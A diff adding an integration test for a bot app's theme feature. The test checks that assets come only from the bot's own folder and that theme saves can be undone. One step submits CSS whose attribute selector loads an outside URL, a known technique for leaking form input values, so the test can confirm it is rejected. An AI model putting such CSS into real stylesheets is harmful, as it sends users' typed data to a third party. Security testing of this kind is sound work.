@@ -294,6 +294,46 @@ it("a window preference changes only while the app window's stream is open: refu
   await reopened.close();
 }, 120_000);
 
+it("a theme turn reads the guide, saves and wears a theme with a picture from its own folder, and only the person's windows hear of it", async () => {
+  const closed = new AbortController();
+  const stream = await fetch(`${url}/api/events?window=1`, { headers: { origin: url }, signal: closed.signal });
+  const reader = stream.body!.getReader();
+  let seen = "";
+  const pump = (async () => { try { for (;;) { const { value, done } = await reader.read(); if (done) return; seen += new TextDecoder().decode(value); } } catch {} })();
+  await expect.poll(() => seen.includes('"kind":"hello"')).toBe(true);
+  const png = Buffer.from("89504e470d0a1a0a0000000d49484452", "hex");
+  mkdirSync(join(dataDir, "workspaces", bot.id), { recursive: true });
+  writeFileSync(join(dataDir, "workspaces", bot.id, "stars.png"), png);
+  writeFileSync(join(dataDir, "outside.png"), png);
+  const css = '[data-look="chat"] { background: url("/api/theme-assets/neon/stars.png") center / cover; }';
+  await start("THEME", [
+    step({ action: "theme" }),
+    step({ action: "set_theme", id: "neon", theme: JSON.stringify({ name: "Neon", canvas: "#0b1020", accent: "#ff2bd6" }) }),
+    step({ action: "add_theme_asset", id: "neon", path: join(dataDir, "workspaces", bot.id, "stars.png") }),
+    step({ action: "add_theme_asset", id: "neon", path: join(dataDir, "outside.png") }, true),
+    step({ action: "set_theme", id: "neon", theme: JSON.stringify({ name: "Neon", canvas: "#0b1020", css: 'input[value^="a"] { background: url(https://example.com/?a) }' }) }, true),
+    step({ action: "set_theme", id: "neon", theme: JSON.stringify({ name: "Neon", canvas: "#0b1020", accent: "#ff2bd6", css }) }),
+  ]);
+  const [read, saved, added, outside, leak, wear] = results(await finished("THEME"));
+  expect(JSON.parse(read.text).guide).toContain('[data-look="composer"]');
+  expect(saved).toMatchObject({ isError: false, text: expect.stringMatching(/^Done: Save the theme Neon and wear it\./) });
+  expect(added).toMatchObject({ isError: false, text: expect.stringContaining('url("/api/theme-assets/neon/stars.png")') });
+  expect(outside.isError).toBe(true);
+  expect(leak).toMatchObject({ isError: true, text: expect.stringContaining("never the internet") });
+  expect(wear.isError).toBe(false);
+  expect(await api("GET", "/api/themes/active")).toMatchObject({ id: "neon", theme: { name: "Neon", css } });
+  const served = await fetch(`${url}/api/theme-assets/neon/stars.png`);
+  expect(served.headers.get("content-type")).toBe("image/png");
+  expect(Buffer.from(await served.arrayBuffer()).equals(png)).toBe(true);
+  expect(seen).toContain('"kind":"theme"');
+  closed.abort();
+  await pump;
+
+  const card = (await settingCards(bot.threadId)).filter((one) => one.card.appSettingRequest.settingId === "appearance.theme").at(-1);
+  expect(await api("POST", `/api/threads/${bot.threadId}/undo`, { requestId: card.card.requestId })).toMatchObject({ ok: true, undone: true });
+  expect((await api("GET", "/api/themes/active")).theme.css).toBeUndefined();
+}, 60_000);
+
 it("a webhook's run may read a setting but not change it", async () => {
   const value = config().rooms?.turnTimeoutMinutes;
   const created = await api("POST", "/api/webhooks", { name: "WEBHOOK-RUN", prompt: "WEBHOOK-RUN: read the lead.", botId: bot.id }, 201);
